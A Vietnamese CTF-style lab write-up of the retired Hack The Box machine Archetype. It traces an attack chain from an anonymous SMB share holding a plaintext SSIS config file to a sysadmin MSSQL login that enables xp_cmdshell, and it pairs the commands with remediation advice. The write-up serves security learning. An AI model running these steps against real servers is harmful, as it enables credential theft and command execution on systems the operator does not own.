Bài tham khảo được biên soạn dựa trên tài liệu kỹ thuật của machine [Archetype](https://www.hackthebox.com/machines/archetype) (Starting Point Tier 1, đã retired trên Hack The Box) và tài liệu bảo mật của Microsoft SQL Server. Bài viết tập trung vào mối liên hệ giữa việc lộ tệp cấu hình triển khai trên thư mục chia sẻ mạng (SMB) và rủi ro khi tài khoản dịch vụ cơ sở dữ liệu giữ quyền quản trị hệ thống (`sysadmin`).

## 01 / Câu hỏi kiến trúc: một tệp cấu hình bị lộ kéo theo những gì?

Trong môi trường doanh nghiệp, các bản sao lưu hoặc gói triển khai SSIS/DTSX đôi khi được đặt trên thư mục chia sẻ SMB để tiện cho quy trình vận hành. Nếu thư mục này cho phép truy cập không xác thực (guest/anonymous read), kẻ tấn công không cần tìm lỗ hổng thực thi mã từ xa trên SMB mà chỉ cần đọc chuỗi kết nối (connection string) bên trong tệp cấu hình.

[![Sơ đồ chuỗi tấn công trên HTB Archetype từ thư mục chia sẻ SMB đến thực thi lệnh qua xp_cmdshell trên MSSQL.](/assets/research/htb-archetype-flow.svg)](/assets/research/htb-archetype-flow.svg)

Hình 1. Sơ đồ chuỗi bốn bước từ thư mục chia sẻ SMB không yêu cầu xác thực đến thực thi lệnh qua `xp_cmdshell` trên Microsoft SQL Server.

Ba câu hỏi kiểm thử được đặt ra theo đúng thứ tự thu thập bằng chứng:

1. **Dịch vụ SMB (TCP/445):** Có thư mục chia sẻ nào không phải mặc định (`ADMIN$`, `C$`, `IPC$`) cho phép phiên đăng nhập rỗng đọc dữ liệu hay không?
2. **Quản lý bí mật (Secret Hygiene):** Tệp cấu hình trong thư mục chia sẻ có chứa thông tin đăng nhập dạng văn bản rõ (plaintext) hay không?
3. **Phạm vi quyền trong MSSQL (TCP/1433):** Tài khoản tìm thấy chỉ có quyền đọc bảng dữ liệu hay có quyền `sysadmin` để bật `xp_cmdshell`?

## 02 / Kiểm tra quyền truy cập thư mục chia sẻ SMB

Trong môi trường lab, bước đầu tiên là xác nhận cổng dịch vụ SMB (`445`) và Microsoft SQL Server (`1433`), sau đó liệt kê danh sách share bằng phiên kết nối không mật khẩu:

```bash
TARGET="IP_CUA_LAB"
nmap -sC -sV -p 135,139,445,1433 "$TARGET" -oN archetype-services.txt

# Liệt kê danh sách thư mục chia sẻ với phiên khách (Null/Guest session):
smbclient -N -L "//$TARGET/"
```

Khi phát hiện một thư mục chia sẻ phi chuẩn như `backups`, bước tiếp theo là kiểm tra xem tài khoản không xác thực có quyền đọc tệp bên trong hay không:

```bash
smbclient -N "//$TARGET/backups"
# Bên trong smbclient:
dir
get prod.dtsConfig
exit
```

Tệp `.dtsConfig` là định dạng cấu hình của SQL Server Integration Services (SSIS). Nếu tệp lưu trực tiếp chuỗi kết nối `Password=...;User ID=...`, bất kỳ ai có quyền đọc thư mục `backups` đều thu được thông tin xác thực của cơ sở dữ liệu.

## 03 / Đánh giá đặc quyền trên Microsoft SQL Server

Sau khi có thông tin tài khoản từ tệp cấu hình, bước kiểm thử tiếp theo sử dụng `mssqlclient.py` (thuộc bộ công cụ [Impacket](https://github.com/fortra/impacket)) với cờ `-windows-auth` để xác nhận phạm vi quyền:

```bash
impacket-mssqlclient "ARCHETYPE/sql_svc@$TARGET" -windows-auth
```

Trong phiên SQL, trước khi thử bất kỳ thao tác cấu hình nào, nhà phân tích cần kiểm tra xem tài khoản hiện tại có thuộc role `sysadmin` hay không:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Nếu kết quả trả về `1`, tài khoản ứng dụng đang nắm quyền cao nhất trên SQL Server. Theo [tài liệu Microsoft về `xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql), thủ tục mở rộng này mặc định bị tắt nhưng một tài khoản `sysadmin` có thể bật lại bằng `sp_configure`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Kiểm chứng ngữ cảnh tài khoản hệ điều hành đang chạy dịch vụ SQL Server:
EXEC xp_cmdshell 'whoami';
```

## 04 / Phân tách các lớp kiểm soát khi viết khuyến nghị khắc phục

Khi tổng hợp báo cáo cho kịch bản như Archetype, việc chỉ khuyến nghị “đổi mật khẩu SQL” sẽ không giải quyết được nguyên nhân gốc. Biện pháp phòng vệ cần tách thành bốn lớp độc lập:

| Lớp kiểm soát | Vấn đề quan sát được | Biện pháp khắc phục cụ thể |
| --- | --- | --- |
| **Phân quyền SMB** | Share `backups` cho phép Guest/Anonymous đọc tệp. | Tắt quyền truy cập Guest trên SMB; giới hạn ACL thư mục chỉ cho tài khoản hệ thống chạy tác vụ sao lưu. |
| **Quản lý cấu hình** | Mật khẩu lưu dạng rõ trong `prod.dtsConfig`. | Chuyển sang xác thực tích hợp (Managed Service Accounts) hoặc mã hóa các gói cấu hình SSIS (`EncryptSensitiveWithPassword`). |
| **Đặc quyền Database** | Tài khoản tích hợp giữ quyền `sysadmin`. | Thu hồi role `sysadmin`; chỉ cấp quyền `db_datareader` / `db_datawriter` trên đúng database nghiệp vụ. |
| **Bề mặt thực thi OS** | Có thể kích hoạt `xp_cmdshell` và chạy dưới tài khoản có nhiều quyền trên máy chủ. | Giữ `xp_cmdshell` ở trạng thái tắt, giám sát sự kiện thay đổi `sp_configure` (Event ID `15457`) và chạy dịch vụ SQL dưới tài khoản đặc quyền tối thiểu. |

## Tài liệu tham khảo

1. Microsoft Learn. [xp\_cmdshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql). Cơ chế quyền hạn và rủi ro bảo mật khi bật thủ tục thực thi lệnh hệ điều hành.
2. Microsoft Learn. [SSIS Package Configuration and Sensitive Data](https://learn.microsoft.com/en-us/sql/integration-services/packages/save-packages). Các cấp độ bảo vệ dữ liệu nhạy cảm (`ProtectionLevel`) trong tệp cấu hình SSIS.
3. Fortra / SecureAuth. [Impacket `mssqlclient.py`](https://github.com/fortra/impacket).

Ghi chú phạm vi: bài viết là tài liệu học tập tham khảo dựa trên machine retired của Hack The Box; không công bố flag và không tuyên bố kết quả từ phiên khai thác thực tế ngoài môi trường lab.
